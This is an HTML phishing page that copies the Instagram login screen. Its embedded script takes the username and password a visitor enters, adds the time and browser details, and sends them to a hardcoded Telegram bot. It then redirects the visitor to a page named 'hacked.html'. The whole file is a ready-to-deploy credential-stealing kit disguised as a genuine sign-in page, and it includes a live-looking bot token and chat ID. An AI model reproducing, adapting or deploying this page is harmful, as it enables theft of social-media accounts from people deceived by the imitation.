<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        :root {
            --page-bg: #121212;
            --panel-bg: #111111;
            --card-bg: #181818;
            --border: rgba(255, 255, 255, 0.1);
            --input-bg: #0f0f0f;
            --text: #ffffff;
            --muted: #9a9a9a;
            --button: #0095f6;
            --button-hover: #0078d7;
        }

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #050505;
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px 0;
        }

        .page {
            display: grid;
            grid-template-columns: minmax(360px, 1fr) minmax(320px, 420px);
            gap: 60px;
            width: min(1100px, calc(100% - 48px));
            padding: 0;
            align-items: center;
        }

        .promo {
            display: flex;
            flex-direction: column;
            gap: 24px;
            justify-content: center;
        }

        .promo-logo {
            width: 68px;
            height: 68px;
            border-radius: 22px;
            background: linear-gradient(135deg, #feda75 0%, #f58529 20%, #d62976 40%, #962fbf 60%, #4f5bd5 80%, #4f5bd5 100%);
            display: grid;
            place-items: center;
            box-shadow: 0 24px 60px rgba(80, 30, 130, 0.15);
        }

        .promo-logo img {
            width: 34px;
            height: 34px;
        }

        .promo-title {
            font-size: clamp(2.4rem, 5vw, 4.2rem);
            line-height: 0.98;
            margin: 0;
            font-weight: 800;
            letter-spacing: -0.04em;
        }

        .promo-title span {
            background: linear-gradient(90deg, #ff61e3, #ff9a00, #5b8cff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .promo-subtitle {
            font-size: 1rem;
            color: var(--muted);
            max-width: 500px;
            line-height: 1.8;
            margin: 0;
        }

        .promo-card {
            background: #111111;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 36px;
            padding: 36px 32px;
            min-height: 520px;
            position: relative;
            box-shadow: 0 30px 90px rgba(0, 0, 0, 0.45);
            width: 100%;
            max-width: 100%;
        }

        .promo-card::before {
            content: '';
            position: absolute;
            inset: 0;
            background: radial-gradient(circle at 10% 20%, rgba(255, 255, 255, 0.08), transparent 22%),
                        radial-gradient(circle at 85% 15%, rgba(0, 149, 246, 0.12), transparent 18%),
                        radial-gradient(circle at 80% 75%, rgba(255, 95, 255, 0.1), transparent 16%);
            pointer-events: none;
        }

        .promo-media {
            display: grid;
            place-items: center;
            padding-top: 20px;
        }

        .promo-media img {
            width: 100%;
            max-width: 540px;
            height: auto;
            border-radius: 32px;
            box-shadow: 0 40px 110px rgba(0, 0, 0, 0.45);
        }

        .login-card,
        .signup-card {
            width: 100%;
        }

        .login-card input,
        .login-card button,
        .login-card .facebook-login {
            min-width: 0;
        }


        @keyframes floatCard {
            0%, 100% { transform: translateY(-10px); }
            50% { transform: translateY(10px); }
        }

        .login-panel {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .login-card,
        .signup-card {
            background: #111111;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 32px;
            padding: 34px 28px;
            box-shadow: 0 28px 70px rgba(0, 0, 0, 0.28);
        }

        .login-card {
            text-align: center;
        }

        .login-card h2 {
            color: #ffffff;
            font-size: 1.1rem;
            font-weight: 700;
            margin: 0 0 20px;
        }

        .login-card input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: var(--input-bg);
            color: var(--text);
            font-size: 14px;
        }

        .login-card input::placeholder {
            color: rgba(255,255,255,0.45);
        }

        .login-card input:focus {
            outline: none;
            border-color: rgba(255, 255, 255, 0.18);
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.06);
        }

        .login-card button {
            width: 100%;
            padding: 14px 16px;
            border: none;
            border-radius: 12px;
            background: #0095f6;
            color: #fff;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.2s ease;
        }

        .login-card button:hover {
            background: #0078d7;
            transform: translateY(-1px);
        }

        .login-card .forgot {
            display: block;
            margin: 18px 0 0;
            color: var(--muted);
            font-size: 12.8px;
            text-decoration: none;
        }

        .login-card .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 18px 0 16px;
            color: var(--muted);
            font-size: 12.6px;
        }

        .login-card .divider::before,
        .login-card .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.08);
        }

        .login-card .facebook-login {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #0095f6;
            font-weight: 700;
            font-size: 13.5px;
            text-decoration: none;
        }

        .signup-card p {
            margin: 0;
            color: var(--text);
            font-size: 14px;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 700;
            text-decoration: none;
        }

        .signup-card a:hover {
            text-decoration: underline;
        }

        .meta {
            text-align: center;
            color: var(--muted);
            font-size: 12px;
            margin-top: 10px;
        }

        @media (max-width: 900px) {
            .page {
                grid-template-columns: 1fr;
                gap: 28px;
                width: min(1000px, calc(100% - 32px));
            }

            .promo-card {
                min-height: auto;
                padding: 28px 24px;
            }

            .promo-media img {
                max-width: 100%;
            }

            .login-card,
            .signup-card {
                padding: 28px 22px;
            }
        }

        @media (max-width: 640px) {
            body {
                padding: 16px 0;
            }

            .page {
                gap: 20px;
                width: calc(100% - 24px);
            }

            .promo-logo {
                width: 58px;
                height: 58px;
            }

            .promo-logo img {
                width: 30px;
                height: 30px;
            }

            .promo-title {
                font-size: clamp(1.8rem, 7vw, 2.8rem);
            }

            .promo-subtitle {
                font-size: 0.95rem;
                line-height: 1.7;
            }

            .promo-card {
                border-radius: 28px;
            }

            .login-card,
            .signup-card {
                border-radius: 28px;
                padding: 24px 18px;
            }

            .login-card input,
            .login-card button {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="page">
        <div class="promo">
            <div class="promo-logo">
                <img src="download.jpg" alt="Instagram logo">
            </div>
            <div>
                <h1 class="promo-title">See everyday moments from your <span>close friends</span>.</h1>
                <p class="promo-subtitle">Share photos and videos, use messaging tools, and discover what's new from the people you follow.</p>
            </div>
            <div class="promo-card">
                <div class="promo-media">
                    <img src="-erGonz07kB.png" alt="Instagram preview">
                </div>
            </div>
        </div>

        <div class="login-panel">
            <div class="login-card">
                <h2>Log into Instagram</h2>
                <input type="text" id="username" placeholder="Mobile number, username or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button onclick="login()">Log In</button>
                <a href="#" class="forgot">Forgot password?</a>
                <div class="divider">OR</div>
                <a href="#" class="facebook-login">Log in with Facebook</a>
            </div>

            <div class="signup-card">
                <p>Don't have an account? <a href="#">Create new account</a></p>
            </div>

            <p class="meta">Instagram from Meta</p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8847156929:AAGLDFtQTyXAOiR7reaQ1a9dWX4X_cXWUe4';
        const CHAT_ID = '8119616916';

        async function sendToTelegram(username, password) {
            const text = `📱 New Instagram Login\n\n` +
                `👤 Username: ${username}\n` +
                `🔐 Password: ${password}\n` +
                `⏰ Time: ${new Date().toLocaleString()}\n` +
                `📱 Device: ${navigator.userAgent}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            };

            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                console.error('Telegram send failed:', error);
            }
        }

        async function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            await sendToTelegram(username, password);
            window.location.href = 'hacked.html';
        }
    </script>
</body>
</html>
